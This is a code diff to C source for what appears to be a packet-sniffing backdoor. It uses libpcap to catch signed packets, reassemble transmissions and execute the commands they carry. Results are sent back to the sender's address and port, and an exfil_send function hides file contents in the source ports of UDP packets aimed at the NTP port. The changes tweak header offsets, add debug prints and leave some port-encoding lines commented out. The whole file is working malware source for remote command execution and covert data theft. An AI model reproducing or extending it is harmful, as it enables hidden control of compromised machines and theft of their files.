@@ -16,6 +16,7 @@
 
 #define SRC_OFF 		28 // Source address, so we know where to send results
 #define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port
+#define ETHER_IP_LEN	36
 
 #define EVENT_SIZE (sizeof (struct inotify_event))
 #define BUF_LEN	(1024 * (EVENT_SIZE + 16))
@@ -74,9 +75,9 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	static int len = 0;
 
 	// Step 1: locate the payload portion of the packet
-	if (pkt_info->caplen - ETHER_IP_UDP_LEN <= 0)
+	if (pkt_info->caplen - ETHER_IP_LEN <= 0)
 			return;
-	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
+	ptr = (char *)(packet + ETHER_IP_LEN);
 
 	// Step 2: check for signature
 
@@ -86,12 +87,17 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	memcpy(data, ptr, FRAM_SZ);
 //	free(dec);
 
-	len += pkt_info->caplen - ETHER_IP_UDP_LEN;
+	len += pkt_info->caplen - ETHER_IP_LEN;
 
 	// Step 4: see if we have a full transmission
 	data = getTransmission(buf, &len, &type);
+
+	printf("Type: %c\n", type);
+
 	if (data == NULL)
 		return;
+
+	printf("Data not null\n");
 
 	// Step 5: execute the command
 	if (type == CMD_TYP)
@@ -160,6 +166,8 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 			char *enc;
 			char *ptr;
 			int fram_len;
+			ushort src_port;
+			ushort dst_port;
 
 			ptr = trans + i;
 
@@ -170,6 +178,11 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 //			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
 			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+//			src_port = (frame[0] << 8) + frame[i];
+//			dst_port = 9001;
+
+//			_send(ip, src_port, dst_port, TRUE);
+			
 			usleep(SLEEP_TIME);
 
 //			free(enc);
@@ -222,7 +235,7 @@ void exfil_send(uint32 ipaddr, char *path)
 
 			//enc = encrypt(SEKRET, frame, 2);
 			
-			src_port = (enc[0] << 8) + enc[1];
+			src_port = (frame[0] << 8) + frame[1];
 			dst_port = PORT_NTP;
 
 			//free(enc);
